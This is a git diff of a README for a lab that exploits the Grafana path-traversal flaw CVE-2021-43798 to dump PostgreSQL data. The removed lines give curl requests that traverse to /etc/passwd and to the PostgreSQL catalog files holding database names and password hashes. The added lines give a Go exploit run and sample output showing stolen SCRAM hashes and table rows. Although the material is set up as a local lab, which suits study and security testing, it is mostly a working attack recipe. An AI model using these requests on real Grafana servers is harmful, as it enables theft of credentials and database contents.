@@ -1,38 +1,28 @@
-# CVE-2021-43798 + pgread Lab
+# CVE-2021-43798 + pgread
 
-**LFI Grafana → Dump PostgreSQL sans credentials**
+Grafana LFI → Full PostgreSQL dump via `pgdump` library.
 
-## Setup
-
-```bash
-docker-compose up -d
-```
-
-## Exploit
+## Run
 
 ```bash
-chmod +x exploit.sh
-./exploit.sh http://localhost:3000
+docker compose up -d
+cd exploit && go build && ./exploit -target http://localhost:13000
 ```
 
-## Manual
+## Output
 
-```bash
-# 1. Test LFI
-curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
-
-# 2. Dump pg_database
-curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../var/lib/postgresql/data/global/1262" -o 1262
-pgread -f 1262
-
-# 3. Dump password hashes
-curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../var/lib/postgresql/data/global/1260" -o 1260
-pgread -f 1260
+```json
+{
+  "passwords": [{"rolename": "admin", "password": "SCRAM-SHA-256$..."}],
+  "databases": [{"Name": "postgres"}, {"Name": "production"}],
+  "control": {"state_string": "in production", "pg_version_major": 16},
+  "dumps": [{"name": "users", "rows": [...]}]
+}
 ```
 
-## Impact
+## Code
 
-| Avant pgread | Avec pgread |
-|--------------|-------------|
-| LFI = Medium | LFI = **Critical** |
-| "I can read /etc/passwd" | "I dumped all password hashes" |
+```go
+lfi := NewLFIReader(target, "/var/lib/postgresql/data")
+result := lfi.DumpAll()  // Uses pgdump.DumpDatabaseFromFiles()
+```
